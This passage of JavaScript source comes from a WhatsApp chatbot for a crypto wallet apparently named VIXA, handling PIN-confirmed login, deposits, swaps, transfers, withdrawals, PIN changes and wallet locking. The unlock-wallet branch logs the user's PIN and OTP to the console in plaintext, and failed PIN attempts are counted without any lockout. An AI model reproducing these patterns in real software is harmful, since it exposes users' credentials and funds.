    await sendWhatsApp(
      phone,
      "⚠️ Invalid PIN. Please try again.",
      phone_number_id,
    );
    return;
  }

  switch (pinContext) {
    // ─────────────────────────────────────────────
    // LOGIN / SESSION RE-AUTH
    // ─────────────────────────────────────────────
    case "LOGIN": {
      try {
        const loginResult = await loginUser({ phoneNumber: phone, pin });

        // loginResult now has { token, isFullyOnboarded, onboardingStage }
        const { isFullyOnboarded, onboardingStage } = loginResult;
        const me = await fetchAuthMe();
        if (!me) throw new Error("ME_NOT_FOUND");

        // Re-read session so we get the tokenExpiresAt that loginUser() just wrote
        const freshSession = await getSession(phone);
        await updateSession(phone, {
          data: {
            ...freshSession.data,
            awaitingPin: false,
            authenticated: true,
            pinAttempts: 0,
          },
        });
        // ── ONBOARDING STAGE CHECK ──────────────────────────

        console.log(
          "Login success. isFullyOnboarded:",
          isFullyOnboarded,
          "stage:",
          onboardingStage,
        );

        if (!isFullyOnboarded) {
          if (onboardingStage === "BasicInfoCompleted") {
            await sendWhatsApp(
              phone,
              `👋 Welcome back ${me.firstName}!\n\nWe noticed your NIN verification is still pending. Please complete it to fully activate your account.`,
              phone_number_id,
            );
            await triggerNINFlow(phone, phone_number_id);
            return;
          }

          if (
            onboardingStage === "NinSubmitted" ||
            onboardingStage === "NinVerified"
          ) {
            await sendWhatsApp(
              phone,
              `👋 Welcome back ${me.firstName}!\n\nYour NIN has been received. Please complete your BVN verification to fully activate your account.`,
              phone_number_id,
            );
            await triggerBVNFlow(phone, phone_number_id);
            return;
          }

          if (onboardingStage === "BvnVerified") {
            await sendWhatsApp(
              phone,
              `👋 Welcome back ${me.firstName}!\n\nYour BVN has been verified. Your wallet is currently being set up — this usually takes just a moment.\n\nYou can go ahead and explore VIXA in the meantime 👇`,
              phone_number_id,
            );
            await sendMainMenu(phone, phone_number_id);
            return;
          }
        }

        await sendWhatsApp(
          phone,
          `Welcome back ${me.firstName} 👋`,
          phone_number_id,
        );

        // ── Resume whatever the expired token interrupted ──────────
        //
        // We restart the flow at its entry point rather than replaying the
        // exact step. Replaying means storing and re-executing the tap that
        // failed, and that's where the bugs live — stale state, changed
        // availability, a different tap in between. One extra tap is the
        // better trade, and re-picking a country after a night away is
        // arguably correct anyway: channel availability may have moved.
        const RESUME_MAX_AGE_MS = 60 * 60 * 1000;
        const resumed = await getSession(phone);
        const resume = resumed.data?.pendingResume;

        // Always clear it, even when stale — a resume marker is single-use.
        if (resume) {
          await updateSession(phone, {
            data: { ...resumed.data, pendingResume: null },
          });
        }

        if (resume?.flow && Date.now() - (resume.at || 0) < RESUME_MAX_AGE_MS) {
          logger.info("session.resumed", { flow: resume.flow });
          const fresh = await getSession(phone);
          await safeRouteToFlow(
            resume.flow,
            phone,
            phone_number_id,
            fresh.data,
          );
          return;
        }

        await sendMainMenu(phone, phone_number_id);
      } catch (err) {
        const attempts = (session.data?.pinAttempts || 0) + 1;
        await updateSession(phone, {
          data: {
            ...session.data,
            pinAttempts: attempts,
            awaitingPin: true,
            authenticated: false,
          },
        });
        await sendWhatsApp(
          phone,
          "❌ Incorrect PIN. Please try again.",
          phone_number_id,
        );
        await triggerPinFlow(phone, phone_number_id, "LOGIN");
      }
      break;
    }

    // ─────────────────────────────────────────────
    // DEPOSIT — PIN to confirm deposit amount
    // ─────────────────────────────────────────────
    case "DEPOSIT": {
      console.log(
        session.data.depositCurrency,
        session.data.depositAmount,
        "AF944F0C-BA70-47C7-86DC-1BAD5A6AB4E4",
        session.data.depositCoin,
        "CORR-${Date.now()",
        "IDEMPOTENCY-${Date.now()",
      );
      const depositResult = await depositCrypto({
        currency: session.data.depositCurrency,
        amountLocal: session.data.depositAmount,
        channelId: "AF944F0C-BA70-47C7-86DC-1BAD5A6AB4E4",
        coin: session.data.depositCoin,
        correlationId: `CORR-${Date.now()}`,
        idempotencyKey: `IDEMPOTENCY-${Date.now()}`,
        pin,
      });

      console.log(depositResult, "depositResult from PIN flow");

      if (!depositResult.success) {
        const rawError = depositResult.error?.message || "Unknown server error";
        const friendly = await humanizeError(rawError, "confirm deposit");
        await sendWhatsApp(phone, friendly, phone_number_id);

        await updateSession(phone, {
          data: {
            ...session.data,
            awaitingDepositPin: false,
            pendingDeposit: true,
          },
        });
        await sendWhatsApp(
          phone,
          "💰 Please enter the amount in NGN you'd like to deposit:",
          phone_number_id,
        );
        return;
      }

      const depositData = depositResult.data.data;
      const expiryDate = new Date(depositData.expiresAtUtc);
      const formattedExpiry = expiryDate.toLocaleTimeString("en-NG", {
        hour: "2-digit",
        minute: "2-digit",
        hour12: true,
        timeZone: "Africa/Lagos",
      });
      const formattedAmount =
        depositData.amountToPayLocal?.toLocaleString("en-NG");
      const accNo = depositData.accountNumber;

      await sendWhatsApp(
        phone,
        {
          type: "interactive",
          interactive: {
            type: "button",
            body: {
              text: `✅ *Deposit Initiated*\n\nPlease make a transfer using the details below:\n💰 *Amount:* ₦${formattedAmount}\n🏦 *Bank Name:* ${depositData.bankName}\n👤 *Account Name:* ${depositData.accountName}\n🔢 *Account Number:* \`${accNo}\`\n🧾 *Reference:* ${depositData.reference}\n⏳ *Expires At:* ${formattedExpiry}\n\nOnce you've completed the transfer, tap *Confirm Payment* below.`,
            },
            action: {
              buttons: [
                {
                  type: "reply",
                  reply: {
                    id: "CONFIRM_DEPOSIT_PAYMENT",
                    title: "Have Paid",
                  },
                },
              ],
            },
          },
        },
        phone_number_id,
      );

      await updateSession(phone, {
        data: {
          ...session.data,
          pendingDeposit: false,
          awaitingDepositPin: false,
          awaitingDepositConfirmation: true,
          depositReference: depositData.reference,
          // `id: session.data.id` read the field back from itself — nothing
          // ever wrote it, so confirmPayment() was always called with
          // undefined and "Have Paid" could never confirm anything.
          depositId: depositData.id ?? depositData.depositId ?? null,
          depositExpiresAt: depositData.expiresAtUtc ?? null,
        },
      });
      break;
    }

    // ─────────────────────────────────────────────
    // SWAP QUOTE — PIN to get quote
    // ─────────────────────────────────────────────
    case "SWAP_QUOTE": {
      // This context isn't used currently (swap uses PIN at execution, not quote).
      // Reserved for future use.
      break;
    }

    // ─────────────────────────────────────────────
    // SWAP EXECUTE — PIN to authorize swap
    // ─────────────────────────────────────────────
    case "SWAP": {
      const { fromCoin, amount, toCoin } = session.data.swap;

      const swapResult = await executeSwap({
        fromCoin,
        fromAmount: amount,
        toCoin,
        pin,
      });

      if (!swapResult.success) {
        const rawError = swapResult.error?.message || "Unknown server error";
        const friendly = await humanizeError(rawError, "execute a crypto swap");
        await sendWhatsApp(phone, friendly, phone_number_id);
        await sendMainMenu(phone, phone_number_id);
        return;
      }

      await sendWhatsApp(
        phone,
        `✅ *Swap Successful!*\n\n${amount} ${fromCoin} → ${swapResult.data.data.toAmount} ${toCoin}\n\n🎉 Your wallet has been updated.`,
        phone_number_id,
      );
      await updateSession(phone, { data: { ...session.data, swap: null } });
      await sendWhatsApp(
        phone,
        "What would you like to do next?",
        phone_number_id,
      );
      await sendMainMenu(phone, phone_number_id);
      break;
    }

    // ─────────────────────────────────────────────
    // SEND CRYPTO — PIN to authorize send
    // ─────────────────────────────────────────────
    case "SEND": {
      const { coin, amount, address, chain, type } = session.data.send;

      const sendRes = await executeSendCrypto({
        type,
        coin,
        chain: chain?.chain,
        amount,
        phoneNumber: phone,
        externalAddress: address,
        pin,
      });

      if (!sendRes.success) {
        const rawError = sendRes.error?.message || "Unknown server error";
        const friendly = await humanizeError(rawError, "send crypto");
        await sendWhatsApp(phone, friendly, phone_number_id);
        return;
      }

      await sendWhatsApp(
        phone,
        `✅ *Transfer Successful!*\n\n${amount} ${coin} sent\nTo: ${address}\n\n🚀 Transaction submitted`,
        phone_number_id,
      );
      await updateSession(phone, { data: { ...session.data, send: null } });
      await sendWhatsApp(
        phone,
        "What would you like to do next?",
        phone_number_id,
      );
      await sendMainMenu(phone, phone_number_id);
      break;
    }

    // ─────────────────────────────────────────────
    // WITHDRAW QUOTE — PIN to generate quote
    // ─────────────────────────────────────────────
    case "WITHDRAW_QUOTE": {
      const { coin, amount, channelId } = session.data.withdraw;

      const quoteRes = await fetchWithdrawalQuote({
        coin,
        amount,
        channelId,
      });

      if (!quoteRes.success) {
        const rawError = quoteRes.error?.message || "Unknown server error";
        const friendly = await humanizeError(
          rawError,
          "get a withdrawal quote",
        );
        await sendWhatsApp(phone, friendly, phone_number_id);
        await updateSession(phone, {
          data: { ...session.data, withdraw: null },
        });
        await sendMainMenu(phone, phone_number_id);
        return;
      }

      const q = quoteRes.data;
      const msgText = `📊 *Withdrawal Quote*\n\nWithdrawing: ${q.coinAmount} ${q.coin}\nEstimated ${q.fiatCurrency}: ${q.estimatedFiat} ${q.fiatCurrency}\nFees: ${q.totalFees}\n\nDo you want to proceed?`;

      await updateSession(phone, {
        data: {
          ...session.data,
          withdraw: {
            ...session.data.withdraw,
            step: "AWAITING_QUOTE_CONFIRM",
          },
        },
      });

      await sendWhatsApp(
        phone,
        {
          type: "interactive",
          interactive: {
            type: "button",
            body: { text: msgText },
            action: {
              buttons: [
                {
                  type: "reply",
                  reply: { id: "QUOTE_CONFIRM_YES", title: "Yes, Proceed" },
                },
                {
                  type: "reply",
                  reply: { id: "WITHDRAW_CANCEL", title: "Cancel" },
                },
              ],
            },
          },
        },
        phone_number_id,
      );
      break;
    }

    // ─────────────────────────────────────────────
    // WITHDRAW EXECUTE — PIN to finalize withdrawal
    // ─────────────────────────────────────────────
    case "WITHDRAW_EXECUTE": {
      const { coin, amount, accountNumber, accountName, networkId, channelId } =
        session.data.withdraw;

      const execRes = await executeWithdrawal({
        coin,
        amount,
        accountNumber,
        accountName,
        networkId,
        channelId,
        pin,
      });

      if (!execRes.success) {
        const rawError = execRes.error?.message || "Unknown server error";
        const friendly = await humanizeError(
          rawError,
          "execute a bank withdrawal",
        );
        await sendWhatsApp(phone, friendly, phone_number_id);
        await updateSession(phone, {
          data: { ...session.data, withdraw: null },
        });
        await sendMainMenu(phone, phone_number_id);
        return;
      }

      const result = execRes.data;
      await sendWhatsApp(
        phone,
        `✅ *Withdrawal Successful!*\n\nAmount: ${result.amount} ${result.coin}\nTo: ${result.accountName}\nBank: ${result.bankName}\nRef: ${result.reference}\n\n🚀 Funds are on the way!`,
        phone_number_id,
      );
      await updateSession(phone, { data: { ...session.data, withdraw: null } });
      await sendWhatsApp(
        phone,
        "What would you like to do next?",
        phone_number_id,
      );
      await sendMainMenu(phone, phone_number_id);
      break;
    }

    case "CHANGE_PIN_CURRENT": {
      await updateSession(phone, {
        data: {
          ...session.data,
          changePin: {
            ...session.data.changePin,
            currentPin: pin,
            step: "ENTER_NEW_PIN",
          },
        },
      });
      await triggerPinFlow(
        phone,
        phone_number_id,
        "CHANGE_PIN_NEW",
        "🔑 Enter your *new PIN*:",
      );
      break;
    }

    case "CHANGE_PIN_NEW": {
      await updateSession(phone, {
        data: {
          ...session.data,
          changePin: {
            ...session.data.changePin,
            newPin: pin,
            step: "ENTER_CONFIRM_PIN",
          },
        },
      });
      await triggerPinFlow(
        phone,
        phone_number_id,
        "CHANGE_PIN_CONFIRM",
        "✅ Confirm your *new PIN* one more time:",
      );
      break;
    }

    case "CHANGE_PIN_CONFIRM": {
      const { currentPin, newPin } = session.data.changePin;

      // Check if new PIN and confirm PIN match
      if (pin !== newPin) {
        await sendWhatsApp(
          phone,
          "❌ Your PINs do not match. Let's try again from the new PIN step.",
          phone_number_id,
        );
        // Keep currentPin, reset new and confirm, go back to new PIN step
        await updateSession(phone, {
          data: {
            ...session.data,
            changePin: {
              currentPin,
              step: "ENTER_NEW_PIN",
            },
          },
        });
        await triggerPinFlow(
          phone,
          phone_number_id,
          "CHANGE_PIN_NEW",
          "🔑 Enter your *new PIN* again:",
        );
        return;
      }

      // Check if new PIN is same as current PIN
      if (pin === currentPin) {
        await sendWhatsApp(
          phone,
          "❌ Your new PIN cannot be the same as your current PIN. Please choose a different PIN.",
          phone_number_id,
        );
        await updateSession(phone, {
          data: {
            ...session.data,
            changePin: {
              currentPin,
              step: "ENTER_NEW_PIN",
            },
          },
        });
        await triggerPinFlow(
          phone,
          phone_number_id,
          "CHANGE_PIN_NEW",
          "🔑 Enter a *different new PIN*:",
        );
        return;
      }

      // Request OTP — backend sends it to user's WhatsApp
      const otpRes = await requestChangePinOtp("ChangePIN");

      if (!otpRes.success) {
        const friendly = await humanizeError(
          otpRes.error?.message || "Unknown error",
          "request a PIN change OTP",
        );
        await sendWhatsApp(phone, friendly, phone_number_id);
        await updateSession(phone, {
          data: { ...session.data, changePin: null },
        });
        await sendMainMenu(phone, phone_number_id);
        return;
      }

      // Save confirmPin and move to OTP step
      await updateSession(phone, {
        data: {
          ...session.data,
          changePin: {
            ...session.data.changePin,
            confirmPin: pin,
            step: "ENTER_OTP",
          },
        },
      });

      await sendWhatsApp(
        phone,
        "✅ An OTP has been sent to your Email Address.\n\nPlease type it here to complete your PIN change:",
        phone_number_id,
      );
      break;
    }

    case "LOCK_WALLET": {
      const { reason } = session.data.lockWallet;

      const lockRes = await lockWallet({ pin, reason });

      if (!lockRes.success) {
        const rawError = lockRes.error?.message || "Unknown error";
        const friendly = await humanizeError(rawError, "lock your wallet");
        await sendWhatsApp(phone, friendly, phone_number_id);
        await updateSession(phone, {
          data: { ...session.data, lockWallet: null },
        });
        await sendMainMenu(phone, phone_number_id);
        return;
      }

      await sendWhatsApp(
        phone,
        "🔒 *Wallet Locked Successfully!*\n\nYour wallet has been locked. To unlock it, go to Settings → Unlock Wallet.",
        phone_number_id,
      );
      await updateSession(phone, {
        data: { ...session.data, lockWallet: null },
      });
      await sendMainMenu(phone, phone_number_id);
      break;
    }

    case "UNLOCK_WALLET": {
      const { otpCode } = session.data.unlockWallet;

      const unlockRes = await unlockWallet({ pin, otpCode });

      console.log(unlockRes, "unlockresponse");
      console.log(otpCode, pin, "response from unlocking");

      if (!unlockRes.success) {
        const rawError = unlockRes.error?.message || "Unknown error";
        const errorLower = rawError.toLowerCase();

        if (
          errorLower.includes("otp") ||
          errorLower.includes("invalid code") ||
          errorLower.includes("expired")
        ) {
          await sendWhatsApp(
            phone,
            "❌ The OTP is invalid or has expired. Please request a new OTP by going to Settings → Unlock Wallet again.",
            phone_number_id,
          );
          await updateSession(phone, {
            data: { ...session.data, unlockWallet: null },
          });
          await sendMainMenu(phone, phone_number_id);
          return;
        }

        const friendly = await humanizeError(rawError, "unlock your wallet");
        await sendWhatsApp(phone, friendly, phone_number_id);
        await updateSession(phone, {
          data: { ...session.data, unlockWallet: null },
        });
        await sendMainMenu(phone, phone_number_id);
        return;
      }

      await sendWhatsApp(
        phone,
        "🔓 *Wallet Unlocked Successfully!*\n\nYour wallet is now active. You can continue using VIXA normally.",
        phone_number_id,
      );
      await updateSession(phone, {
        data: { ...session.data, unlockWallet: null },
      });
      await sendMainMenu(phone, phone_number_id);
      break;
    }

    default: {
      console.warn("Unknown pinContext:", pinContext);
      await sendWhatsApp(
        phone,
        "⚠️ Something went wrong with PIN context. Please start over.",
        phone_number_id,
      );
      await sendMainMenu(phone, phone_number_id);
    }
  }
}

async function handleItemSelection({
  phone,
  phone_number_id,
  selectedId,
  itemContext,
}) {
  const session = await getSession(phone);

  if (!selectedId) {
    await sendWhatsApp(phone, "⚠️ Nothing was selected.", phone_number_id);
    return;
  }

  switch (itemContext) {
    // ── SWAP: from-coin ──────────────────────────────
    case "SWAP_FROM": {
      const selected = session.data?.swap?.allCoins?.find(
        (c) => c.coin === selectedId,
      );

      if (!selected) {
        await sendWhatsApp(
          phone,
          "⚠️ Coin not found. Please start over.",
          phone_number_id,
        );
        await sendMainMenu(phone, phone_number_id);
        return;
      }

      await updateSession(phone, {
        data: {
          ...session.data,
          swap: {
            ...session.data.swap,
            step: "ENTER_AMOUNT",
            fromCoin: selectedId,
            fromCoinLimits: selected,
          },
        },
      });

      await sendWhatsApp(
        phone,
        `💰 Enter amount of *${selectedId}* to swap\n\nMin: ${selected.minAmount}\nMax: ${selected.maxAmount}`,
        phone_number_id,
      );
      return;
    }

    // ── SWAP: to-coin ────────────────────────────────
    case "SWAP_TO": {
      const toCoin = selectedId;
      const { amount, fromCoin } = session.data?.swap || {};

      const quote = await fetchSwapQuote({
        fromCoin,
        toCoin,
        fromAmount: amount,
      });

      if (!quote.success) {
        const rawError = quote.error?.message || "Unknown server error";
        const friendly = await humanizeError(rawError, "get a swap quote");
        await sendWhatsApp(phone, friendly, phone_number_id);
        return;
      }

      await updateSession(phone, {
        data: {
          ...session.data,
          swap: {
            ...session.data.swap,
            step: "AWAITING_SWAP_PIN",
            toCoin,
            quote: quote.data.data,
          },
        },
      });

      await sendWhatsApp(
        phone,
        `🔄 *Swap Ready*\n\n` +
          `From: ${amount} ${fromCoin}\n` +
          `To: ${quote.data.data.toAmount} ${toCoin}\n` +
          `Fee: ${quote.data.data.fee}\n\n` +
          `🔐 Please enter your *PIN* to authorize this swap.`,
        phone_number_id,
      );
      await triggerPinFlow(phone, phone_number_id, "SWAP");
      return;
    }

    // ── SEND: coin ───────────────────────────────────
    case "SEND_COIN": {
      const coin = selectedId;
      const selectedCoin = session.data?.send?.coins?.find(
        (c) => c.coin === coin,
      );

      if (!selectedCoin) {
        await sendWhatsApp(phone, "⚠️ Coin not found.", phone_number_id);
        return;
      }

      // P2P → no chain needed
      if (session.data.send.type === "P2P") {
        await updateSession(phone, {
          data: {
            ...session.data,
            send: {
              ...session.data.send,
              coin,
              chain: null,
              step: "ENTER_AMOUNT",
            },
          },
        });
        await sendWhatsApp(
          phone,
          `💸 Enter amount of *${coin}* to send:`,
          phone_number_id,
        );
        return;
      }

      const chains = selectedCoin.chains || [];

      // Single chain → auto-select
      if (chains.length === 1) {
        await updateSession(phone, {
          data: {
            ...session.data,
            send: {
              ...session.data.send,
              coin,
              chain: chains[0],
              step: "ENTER_AMOUNT",
            },
          },
        });
        await sendWhatsApp(
          phone,
          `💸 Enter amount of *${coin}* to send\nMin: ${chains[0].minWithdrawAmount}`,
          phone_number_id,
        );
        return;
      }

      // Multi-chain → second selection flow
      await updateSession(phone, {
        data: {
          ...session.data,
          send: { ...session.data.send, coin, chains, step: "SELECT_CHAIN" },
        },
      });

      await triggerItemSelectionFlow(phone, phone_number_id, {
        context: "SEND_CHAIN",
        items: chains.map((ch) => ({
          id: ch.chain,
          title: ch.chain,
          description: `Min: ${ch.minWithdrawAmount}`,
        })),
        bodyText: `📤 Select the ${coin} network`,
        heading: `Select ${coin} network`,
        label: "Network",
        cta: "Select Network",
      });
      return;
    }

    // ── SEND: chain ──────────────────────────────────
    case "SEND_CHAIN": {
      const chain = session.data?.send?.chains?.find(
        (c) => c.chain === selectedId,
      );

      if (!chain) {
        await sendWhatsApp(phone, "⚠️ Network not found.", phone_number_id);
        return;
      }

      await updateSession(phone, {
        data: {
          ...session.data,
          send: { ...session.data.send, chain, step: "ENTER_AMOUNT" },
        },
      });

      await sendWhatsApp(
        phone,
        `💸 Enter amount of *${session.data.send.coin}* to send\nMin: ${chain.minWithdrawAmount}`,
        phone_number_id,
      );
      return;
    }

    // ── RECEIVE: coin ────────────────────────────────
    case "RECEIVE_COIN": {
      const coin = selectedId;
      const walletsRes = await fetchReceiveWallets({ coin });

      if (!walletsRes.success) {
        await sendWhatsApp(
          phone,
          "⚠️ Unable to load receive wallets.",
          phone_number_id,
        );
        return;
      }

      const wallets = walletsRes?.data?.data?.data || [];

      if (!wallets.length) {
        await sendWhatsApp(
          phone,
          `⚠️ No receive wallets available for ${coin}.`,
          phone_number_id,
        );
        return;
      }

      // Single wallet → show address directly
      if (wallets.length === 1) {
        const w = wallets[0];
        await sendWhatsApp(
          phone,
          `📥 *${w.coin} Receive Address*\n\n` +
            `Network: ${w.network}\n` +
            `Chain: ${w.chain}\n\n` +
            `📌 *Tap & hold to copy address:*\n` +
            `\`\`\`\n${w.address}\n\`\`\``,
          phone_number_id,
        );
        await updateSession(phone, {
          data: { ...session.data, receive: null },
        });
        await sendMainMenu(phone, phone_number_id);
        return;
      }

      await updateSession(phone, {
        data: {
          ...session.data,
          receive: { step: "SELECT_CHAIN", wallets, selectedCoin: coin },
        },
      });

      await triggerItemSelectionFlow(phone, phone_number_id, {
        context: "RECEIVE_WALLET",
        items: wallets.map((w) => ({
          id: w.id,
          title: w.chain,
          description: w.network,
        })),
        bodyText: `📥 Select the ${coin} network`,
        heading: `Select ${coin} network`,
        label: "Network",
        cta: "Select Network",
      });
      return;
    }

    // ── RECEIVE: wallet / chain ──────────────────────
    case "RECEIVE_WALLET": {
      const wallet = session.data?.receive?.wallets?.find(
        (w) => String(w.id) === String(selectedId),
      );

      if (!wallet) {
        await sendWhatsApp(phone, "⚠️ Wallet not found.", phone_number_id);
        return;
      }

      await sendWhatsApp(
        phone,
        `📥 *${wallet.coin} Receive Address*\n\n` +
          `Network: ${wallet.network}\n` +
          `Chain: ${wallet.chain}\n\n` +
          `📌 *Tap & hold to copy address:*\n` +
          `\`\`\`\n${wallet.address}\n\`\`\``,
        phone_number_id,
      );

      await updateSession(phone, {
        data: { ...session.data, receive: null },
      });
      await sendMainMenu(phone, phone_number_id);
      return;
    }

    // ── WITHDRAW: coin ───────────────────────────────
    case "WITHDRAW_COIN": {
      await updateSession(phone, {
        data: {
          ...session.data,
          withdraw: {
            ...session.data.withdraw,
            coin: selectedId,
            step: "ENTER_AMOUNT",
          },
        },
      });

      await sendWhatsApp(
        phone,
        `💰 Please enter the amount of *${selectedId}* you want to withdraw:`,
        phone_number_id,
      );
      return;
    }

    default: {
      console.warn("Unknown itemContext:", itemContext);
      await sendWhatsApp(
        phone,
        "⚠️ Something went wrong with that selection. Please start over.",
        phone_number_id,
      );
      await sendMainMenu(phone, phone_number_id);
    }
  }
}

async function sendPaginatedSwapCoinsMenu(
  to,
  phone_number_id,
  coinsList,
  page = 0,
  direction = "FROM",
) {
  const itemsPerPage = 9;
  const startIndex = page * itemsPerPage;
  const endIndex = startIndex + itemsPerPage;

  const currentChunk = coinsList.slice(startIndex, endIndex);

  const rows = currentChunk.map((c) => ({
    id: `SWAP_${direction}_${c.coin}`,
    title: c.coin,
    description: `Min: ${c.minAmount}, Max: ${c.maxAmount}`,
  }));

  if (endIndex < coinsList.length) {
    rows.push({
      id: `SWAP_${direction}_PAGE_${page + 1}`,
      title: "➡️ See More Coins",
      description: "Tap to load more options",
    });
  }

  const bodyText =
    direction === "FROM"
      ? `🔄 Select the coin you want to swap *from* (Page ${page + 1}):`
      : `➡️ Select the coin you want to receive (Page ${page + 1}):`;

  await sendWhatsApp(
    to,
    {
      type: "interactive",
      interactive: {
        type: "list",
        body: { text: bodyText },
        action: {
          button: "Select coin",
          sections: [{ title: "Available Coins", rows }],
        },
      },
    },
    phone_number_id,
  );
}

async function sendPaginatedBanksMenu(
  to,
  phone_number_id,
  banksList,
  page = 0,
) {
  const itemsPerPage = 9;
  const startIndex = page * itemsPerPage;
  const endIndex = startIndex + itemsPerPage;

  const currentChunk = banksList.slice(startIndex, endIndex);

  const rows = currentChunk.map((b) => ({
    id: `WITHDRAW_BANK_${b.id}`,
    title: b.name.substring(0, 24),
  }));

  if (endIndex < banksList.length) {
    rows.push({
      id: `WITHDRAW_BANK_NEXT_PAGE`,
      title: "➡️ See More Banks",
      description: "Tap to load more options",
    });
  }

  await sendWhatsApp(
    to,
    {
      type: "interactive",
      interactive: {
        type: "list",
        body: { text: `🏦 Select your destination bank (Page ${page + 1}):` },
        action: {
          button: "Select Bank",
          sections: [{ title: "Available Banks", rows }],
        },
      },
    },
    phone_number_id,
  );
}

// 🆕 HELPER: Send Paginated Countries List
async function sendPaginatedCountriesMenu(
  to,
  phone_number_id,
  countriesList,
  page = 0,
) {
  const itemsPerPage = 9; // Leave 1 slot for the "See More" button
  const startIndex = page * itemsPerPage;
  const endIndex = startIndex + itemsPerPage;

  // Slice exactly 9 items for the current page
  const currentChunk = countriesList.slice(startIndex, endIndex);

  const rows = currentChunk.map((c) => ({
    id: `WITHDRAW_COUNTRY_${c.countryCode}`,
    title: `${c.flag} ${c.countryName}`.substring(0, 24),
  }));

  // If there are more items left in the full array, add a 10th "Next" button
  if (endIndex < countriesList.length) {
    rows.push({
      id: `WITHDRAW_COUNTRY_NEXT_PAGE`,
      title: "➡️ See More Countries",
      description: "Tap to load more options",
    });
  }

  await sendWhatsApp(
    to,
    {
      type: "interactive",
      interactive: {
        type: "list",
        body: { text: `🌍 Select your withdrawal country (Page ${page + 1}):` },
        action: {
          button: "Select Country",
          sections: [{ title: "Supported Countries", rows }],
        },
      },
    },
    phone_number_id,
  );
}

async function sendWithdrawTypeMenu(to, phone_number_id) {
  await sendWhatsApp(
    to,
    {
      type: "interactive",
      interactive: {
        type: "list",
        body: { text: "How would you like to withdraw?" },
        action: {
          button: "Select Option",
          sections: [
            {
              title: "Withdrawal Options",
              rows: [
                { id: "WITHDRAW_TYPE_USDT", title: "Withdraw in USDT" },
                { id: "WITHDRAW_TYPE_OTHER", title: "Withdraw other coin" },
              ],
            },
          ],
        },
      },
    },
    phone_number_id,
  );
}

/** Flow ids rendered for humans, for confirmations and acknowledgements. */
const FLOW_LABELS = {
  DEPOSIT: "deposit",
  WITHDRAW: "withdrawal",
  SWAP: "swap",
  SEND: "transfer",
  RECEIVE: "receive",
  BALANCE: "balance check",
  SUPPORT: "support",
  CHANGE_PIN: "PIN change",
  LOCK_WALLET: "wallet lock",
  UNLOCK_WALLET: "wallet unlock",
  SETTINGS: "settings",
  LOGIN: "sign-in",
};

function humanFlowName(flow) {
  return FLOW_LABELS[flow] || String(flow || "action").toLowerCase();
}

/**
 * Clear any in-progress flow, acknowledge, and enter `flow`.
 *
 * Everything that starts a flow goes through here so that a failure inside
 * routeToFlow can never leave the user staring at an unanswered message.
 */
async function startFlow(flow, from, phone_number_id, { ack } = {}) {
  const current = await getSession(from);
  await updateSession(from, { data: clearedFlowState(current.data) });
  const fresh = await getSession(from);

  if (ack) await sendWhatsApp(from, ack, phone_number_id);

  await safeRouteToFlow(flow, from, phone_number_id, fresh.data);
}

/**
 * routeToFlow, but a thrown error becomes a message the user can act on
 * rather than silence. This is the guard that was missing when the swap
 * currency lookup blew up mid-route.
 */
async function safeRouteToFlow(flow, from, phone_number_id, sessionData) {
  try {
    await routeToFlow(flow, from, phone_number_id, sessionData);
  } catch (err) {
    console.error(`routeToFlow(${flow}) failed:`, err);
    logger.error?.("routeToFlow failed", { flow, error: err?.message });

    // Don't strand the user inside a half-entered flow.
    try {
      const current = await getSession(from);
      await updateSession(from, { data: clearedFlowState(current.data) });
    } catch (cleanupErr) {
      console.error("state cleanup failed:", cleanupErr);
    }

    await sendWhatsApp(
      from,
      `⚠️ Sorry, I couldn't open ${humanFlowName(flow)} just now. Please try again in a moment.`,
      phone_number_id,
    );
    await sendMainMenu(from, phone_number_id);
  }
}

async function routeToFlow(flow, from, phone_number_id, sessionData) {
  switch (flow) {
    case "DEPOSIT": {
      await updateSession(from, {
        data: {
          ...sessionData,
          pendingDeposit: true,
          depositCoin: "USDT",
          depositChain: "SOL",
          depositCurrency: "NGN",
        },
      });
      await sendWhatsApp(
        from,
        "💰 Please enter the amount in NGN you want to deposit for your USDT wallet:",
        phone_number_id,
      );
      break;
    }
    case "WITHDRAW": {
      await updateSession(from, {
        data: { ...sessionData, withdraw: { step: "SELECT_WITHDRAW_REGION" } },
      });
      await sendWhatsApp(
        from,
        {
          type: "interactive",
          interactive: {
            type: "button",
            body: { text: "📍 Where are you withdrawing to?" },
            action: {
              buttons: [
                {
                  type: "reply",
                  reply: { id: "WITHDRAW_REGION_NG", title: "🇳🇬 Nigeria" },
                },
                {
                  type: "reply",
                  reply: {
                    id: "WITHDRAW_REGION_OTHER",
                    title: "🌍 Other Countries",
                  },
                },
              ],
            },
          },
        },
        phone_number_id,
      );
      break;
    }
    case "SEND": {
      await updateSession(from, {
        data: { ...sessionData, send: { step: "SELECT_SEND_TYPE" } },
      });
      await sendWhatsApp(
        from,
        {
          type: "interactive",
          interactive: {
            type: "list",
            body: { text: "Who are you sending to? 😊" },
            action: {
              button: "Choose recipient",
              sections: [
                {
                  title: "Send Options",
                  rows: [
                    {
                      id: "SEND_TYPE_P2P",
                      title: "Another Vixa user",
                      description: "Send to a phone number",
                    },
                    {
                      id: "SEND_TYPE_EXTERNAL",
                      title: "External wallet",
                      description: "Send to blockchain address",
                    },
                  ],
                },
              ],
            },
          },
        },
        phone_number_id,
      );
      break;
    }
    case "RECEIVE": {
      const walletsRes = await fetchReceiveWallets();
      if (!walletsRes.success) {
        await sendWhatsApp(
          from,
          "⚠️ Unable to load receive options right now.",
          phone_number_id,
        );
        return;
      }
      const wallets = walletsRes?.data?.data?.data || [];
      if (!wallets.length) {
        await sendWhatsApp(
          from,
          "⚠️ No receive wallets available.",
          phone_number_id,
        );
        return;
      }
      const uniqueCoins = [...new Set(wallets.map((w) => w.coin))];

      await updateSession(from, {
        data: { ...sessionData, receive: { step: "SELECT_COIN", wallets } },
      });

      await triggerItemSelectionFlow(from, phone_number_id, {
        context: "RECEIVE_COIN",
        items: uniqueCoins.map((coin) => ({
          id: coin,
          title: coin,
          description: `Receive ${coin}`,
        })),
        bodyText: "📥 Select the coin you want to receive",
        heading: "Select coin to receive",
        label: "Coin",
        cta: "Select Coin",
      });
      break;
    }
    case "SWAP": {
      const { coins: selectedCoins, error: swapErr } = await loadSwapCoins();

      if (swapErr) {
        await sendWhatsApp(from, swapErr, phone_number_id);
        return;
      }

      await updateSession(from, {
        data: {
          ...sessionData,
          swap: {
            step: "SELECT_FROM",
            allCoins: selectedCoins,
          },
        },
      });

      await triggerItemSelectionFlow(from, phone_number_id, {
        context: "SWAP_FROM",
        items: selectedCoins.map((c) => ({
          id: c.coin,
          title: c.coin,
